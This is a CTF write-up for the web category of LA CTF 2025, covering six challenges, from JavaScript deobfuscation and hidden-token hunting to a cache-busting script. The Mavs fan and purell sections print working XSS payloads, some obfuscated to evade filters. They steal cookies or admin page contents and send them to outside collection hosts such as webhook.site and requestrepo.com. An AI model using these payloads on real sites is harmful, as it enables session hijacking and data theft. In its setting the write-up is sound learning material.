---
title: LA CTF 2025
published: 2025-02-15
description: "Writeup for web category of LA CTF 2025"
image: "./cover.jpeg"
tags: ["2025"]
category: Web
draft: false
---

:::note[Introduction]
I solved 6/13 chall of web category in LA CTF 2025
:::

## Lucky flag:

![image](https://github.com/user-attachments/assets/9db3dedd-d9f7-4654-b9a4-2e186ad0152d)

F12, then we can see some javascript code:

```javascript
const $ = q => document.querySelector(q);
const $a = q => document.querySelectorAll(q);

const boxes = $a('.box');
let flagbox = boxes[Math.floor(Math.random() * boxes.length)];

for (const box of boxes) {
  if (box === flagbox) {
    box.onclick = () => {
      let enc = `"\\u000e\\u0003\\u0001\\u0016\\u0004\\u0019\\u0015V\\u0011=\\u000bU=\\u000e\\u0017\\u0001\\t=R\\u0010=\\u0011\\t\\u000bSS\\u001f"`;
      for (let i = 0; i < enc.length; ++i) {
        try {
          enc = JSON.parse(enc);
        } catch (e) { }
      }
      let rw = [];
      for (const e of enc) {
        rw['\x70us\x68'](e['\x63har\x43ode\x41t'](0) ^ 0x62);
      }
      const x = rw['\x6dap'](x => String['\x66rom\x43har\x43ode'](x));
      alert(`Congrats ${x['\x6aoin']('')}`);
    };
    flagbox = null;
  } else {
    box.onclick = () => alert('no flag here');
  }
};
```

If box =  flagbox => flag, so we just use the code in if clause and use console in dev tool to run it, payload here:

```javascript
let enc = `"\\u000e\\u0003\\u0001\\u0016\\u0004\\u0019\\u0015V\\u0011=\\u000bU=\\u000e\\u0017\\u0001\\t=R\\u0010=\\u0011\\t\\u000bSS\\u001f"`;
      for (let i = 0; i < enc.length; ++i) {
        try {
          enc = JSON.parse(enc);
        } catch (e) { }
      }
      let rw = [];
      for (const e of enc) {
        rw['\x70us\x68'](e['\x63har\x43ode\x41t'](0) ^ 0x62);
      }
      const x = rw['\x6dap'](x => String['\x66rom\x43har\x43ode'](x));
      alert(`Congrats ${x['\x6aoin']('')}`);
```
The result we get is flag

![image](https://github.com/user-attachments/assets/f57f9e34-5c15-4f83-8146-e30210e03cad)

### Flag:
`lactf{w4s_i7_luck_0r_ski11}`

## I spy:

### Phase 1:

![image](https://github.com/user-attachments/assets/42c21ef0-3216-480f-b1e8-bab6f05bf16b)

Just copy paste this token chall provide: `B218B51749AB9E4C669E4B33122C8AE3`

### Phase 2:

![image](https://github.com/user-attachments/assets/35b2cdf6-4527-4ba5-9016-8b6b759a62ec)

In source code, we can see a token: `66E7AEBA46293C88D484CDAB0E479268`

![Screenshot 2025-02-15 113023](https://github.com/user-attachments/assets/fdb665a4-5ce3-4efb-beb6-8d41a2c3f8cf)

### Phase 3: 

![image](https://github.com/user-attachments/assets/2f76ac33-00b3-4949-884d-f64e183c71d1)

Open dev tool, in the console, there is a token: `5D1F98BCEE51588F6A7500C4DAEF8AD6`

![image](https://github.com/user-attachments/assets/00df0f09-5d78-4ac8-ab23-3c0f03de1508)

### Phase 4: 

![image](https://github.com/user-attachments/assets/cbd59e31-9dda-4195-a67f-da19e6e7437e)

Clearly that the token is in source of `style.css`, token: `29D3065EFED4A6F82F2116DA1784C265`

![image](https://github.com/user-attachments/assets/09df2073-1f02-4876-b28f-04c180b44495)

### Phase 5: 

![image](https://github.com/user-attachments/assets/693a279c-b201-4a4c-9183-926ca4f07ea5)

Continue using dev tool, i found a javascript file name `thingy.js`. In this file, a token appear: `9D34859CA6FC9BB8A57DB4F444CDAE83`

![image](https://github.com/user-attachments/assets/0346f96e-3fed-4d19-8d5f-161d175aebc1)

### Phase 6: 

![image](https://github.com/user-attachments/assets/37c90ce2-c09b-40c1-93f0-3f472813a380)

Open proxy analysis tool and find header, we found a header like this: `x-token: BF1E1EAA5C8FDA6D9D0395B6EA075309`

![image](https://github.com/user-attachments/assets/6094854d-4d4a-4b57-94bb-f0fe88512ceb)

### Phase 7:

![image](https://github.com/user-attachments/assets/944c55de-5377-4221-9263-67af623fa2ce)

Open application and see the cookie: `a-token: 647E67B4A8F4AA28FAB602151F1707F2`

![image](https://github.com/user-attachments/assets/c80f951f-927a-4f08-951e-87e943fc25ec)

### Phase 8: 

![image](https://github.com/user-attachments/assets/62826b90-3e3d-4554-962f-2dc81bbf2f93)

Token in endpoint `/robots.txt`, after access `/robots.txt`, we can see a hidden path: `/a-magical-token.txt`

![image](https://github.com/user-attachments/assets/733c21f9-a3d7-4622-b058-12d63d357332)

Using this endpoint and we have token: `3FB4C9545A6189DE5DE446D60F82B3AF`

### Phase 9:

![image](https://github.com/user-attachments/assets/a830dc48-ebdc-4851-aebb-19f13f9d0893)

In `/sitemap.xml`, we can see token for this phase: `F1C20B637F1B78A1858A3E62B66C3799`

![image](https://github.com/user-attachments/assets/c1d1f600-40d3-4549-b2fc-fd937e2efada)


### Phase 10:

![image](https://github.com/user-attachments/assets/ff9377f1-7e4b-4bf9-93a4-dcc4c5f96f7f)

Make a DELETE request and easy token: `32BFBAEB91EFF980842D9FA19477A42E`

![image](https://github.com/user-attachments/assets/dd2ff54d-b614-4cba-ba00-79b74d1c6163)

### Phase 11: 

![image](https://github.com/user-attachments/assets/c8d1b21f-ae10-4cbf-ad8e-4b7f4f6b3c08)

Sử dụng command: `nslookup -type=TXT i-spy.chall.lac.tf` and get the token: `7227E8A26FC305B891065FE0A1D4B7D4`

![image](https://github.com/user-attachments/assets/4929a5cc-4822-414a-af52-26b540b99990)

### Flag:
`lactf{1_sp0773d_z_t0k3ns_4v3rywh3r3}`

## Mavs fan:

![image](https://github.com/user-attachments/assets/189b77f2-7edc-493a-9de7-792c06281f85)

Test with payload `<img src=0 onerror=alert(1)>`

![image](https://github.com/user-attachments/assets/8f02e68e-b158-46c7-8641-37a11f0f1c2e)

So, this page is injectable with xss attack. Now using your payload to get the flag.

```
<img src=0 onerror="fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/505441f7-f71f-4349-aaaa-5a1615cf4cca', {method: 'POST', mode:'no-cors', body: JSON.stringify(r) }))">
```

![image](https://github.com/user-attachments/assets/9d969e5d-ec3b-4212-8009-6e6803e2f2ba)

### Flag:
`lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`

## Chessbased:

![image](https://github.com/user-attachments/assets/112ab03a-6333-4554-93e5-c0a57f136d56)

Because they forgot to restrict user from using `/render` to get flag, so:

![image](https://github.com/user-attachments/assets/6d85ff89-8516-4a4e-8c36-0605560a7f75)

### Flag:
`lactf{t00_b4s3d_4t_ch3ss_f3_kf2}`

## Cache it to win it:

![image](https://github.com/user-attachments/assets/fd2e1a68-5dcd-4233-9116-60a58569d57e)

After the first request, X-Cache become hit, so it can't decrease anymore

But when you add a `+`, something is happen

![image](https://github.com/user-attachments/assets/41c4b214-fad7-4285-8ae6-13b74d829e90)

Then, if you add a `%00`, it is continue to decrease. It is also work with `%01`, `%02`, ..., until `%08`

:::note[Solution]
Write a script that send response to url with from `%00` to `%08` and add some plus behind ( if you add too much `+`, it not work )
:::

```python
import requests

url="https://cache-it-to-win-it.chall.lac.tf/check?uuid="

#remember to change it to your uuid
uuid="3686697b-9a6e-49ed-845b-c6f0f0f12564"

cookie={
    "id": f"{uuid}"
}
for i in range(2): 
    for j in range(9):
        for k in range(7):
            payload=f"%0{j}"*(i+1)+"+"*k
            response=requests.get(url+uuid+payload, cookies=cookie)
            print(response.links)
            print(response.text)
            if("FLAG" in response.text):
                exit()
```

### Flag: 
`lactf{my_c4ch3_f41l3d!!!!!!!}`

## purell:

![image](https://github.com/user-attachments/assets/569f0356-4dde-4c52-aa94-b9a1ebb2d9a4)

This chall is very long, so i will talk brief about solution:

### Part1:
- payload: `<script>document.location="https://webhook.site/b47e057f-74f9-43a1-9a2b-2173e37868e5?cookie="+document.cookie</script>`
- token: `purell-token{gu4u_of_exf1l}`
- flag: `lactf{1_4m_z3_`
- name: `start`

### Part2:
- payload: `<SCRIPT>fetch('/level/no-scr7pt-owo').then(r=>r.text()).then(h=>fetch('https://039vmnou.requestrepo.com?d='+btoa(h)))</SCRIPT>`
- token: `purell-token{scr7ptl355_m3n4c3}`
- flag: `b3s7_x40ss_`
- name: `no-scr7pt-owo`


### Part3: 
- payload: `<SCRIPT>fetch('/level/no-more-xss').then(r=>r.text()).then(h=>fetch('https://039vmnou.requestrepo.com?d='+btoa(h)))</SCRIPT>`
- token: `purell-token{XSS_IS_UNSTOPPABLE_RAHHHH}`
- flag: `h4nd_g34m_`
- name: `no-more-xss`


### Part4: 
- payload: ```<textarea/autofocus/oonnfocus="eval.call`${'fetch\x28\x27/level/parentheless\x27\x29.then\x28functioonn\x28r\x29 {r.text\x28\x29.then\x28functioonn\x28h\x29 {fetch\x28\x27https://webhook.site/69e2d5f4-7d94-465f-a4d9-ef846049a20c?d=\x27 + btoa\x28h\x29\x29;}\x29;}\x29;'}`";>``` (from part 4 -> 7)
- token: `purell-token{a_l7l_b7t_0f_m00t4t70n}`
- flag: `4cr0ss_411_t1m3`
- name: `tricky-lil-hacker`

### Part 5: 
- payload: like part 4
- token: `purell-token{html_7s_m4lf0rmed_bu7_no7_u}`
- flag: `_4nd_z_`
- name: `sneeki-breeki`

### Part 6: 
- payload: like part 4
- flag: `un1v3rs3`
- token: `purell-token{wh3n_th3_imp0st4_i5_5u5_bu7_th3r35_n0_sp4c3}`
- name: `spaceless`
- other payload: `<textarea/autofocus/oonnfocus="fetch('/level/spaceless').then(functioonn(r) {r.text().then(functioonn(h) {fetch('https://webhook.site/69e2d5f4-7d94-465f-a4d9-ef846049a20c?d=' + btoa(h));});});";>`

### Part 7: 
- payload: like part 4
- token: `purell-token{y0u_4r3_th3_0n3_wh0_c4ll5}`
- flag: `_1nf3c71ng_3v34y_1}`
- name: `parentheless`

### Flag: 
`lactf{1_4m_z3_b3s7_x40ss_h4nd_g34m_4cr0ss_411_t1m3_4nd_z_un1v3rs3_1nf3c71ng_3v34y_1}`

